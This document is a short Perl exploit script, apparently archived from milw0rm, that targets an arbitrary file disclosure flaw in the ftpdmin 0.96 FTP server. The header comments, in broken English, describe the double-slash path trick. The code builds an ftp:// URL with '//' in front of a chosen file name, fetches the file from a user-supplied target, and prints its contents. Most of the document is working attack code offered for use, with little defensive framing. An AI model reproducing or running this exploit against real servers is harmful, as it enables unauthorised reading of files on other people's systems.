#!/usr/bin/perl
#       ftpdmin 0.96 Arbitrary File Disclosure Exploit
#       Vulnerability Disclosure by 1 Slach or 2 Slach
#       Tested on Win XP SP2 but it work in other box environment
# Abouts Exploit : first thing after we exec the application it make our box a simple ftp server
# so like we see if we want conect in ftp we make that's cmd >> ftp 127.0.0.1 >> user & password allright
# but here our application make an ftp link for exec and partage some file in our box
# so we profite with this partage fontion to get some importent file in server like boot.ini for example
# for that's i make this exploit it conect to ftp trget via 21 port and if after with a single or doble slach we wrote
# our importent file like boot.ini
# so this the end of all
# message for (ks) use your mind to have more importent thing in server
 

use LWP::Simple;
use LWP::UserAgent;
 
if (@ARGV < 3) {
            print("Usage: $0 <url> <port> <filename> <target> \n");
            print("TARGETS are\n ");
            print("Define full path with file name \n");
            print("Example FTP: perl $0 127.0.0.1 21 boot.ini \n");
            exit(1);
                    }
                    ($target, $port,$filename) = @ARGV;
        print("ftpdmin 0.96 Exploit : Coded by Stack!\n");
        print("Attacking $target on port $port!\n");
        print("FILENAME:  $filename\n");
       
        $temp="/" x 2;
         my $url= "ftp://". $target. ":" . $port .$temp . $filename;
            $content=get $url;
            print("\n FILE CONTENT STARTED");
            print("\n -----------------------------------\n");
            print("$content");
            print("\n -------------------------------------\n");

# milw0rm.com [2009-04-13]
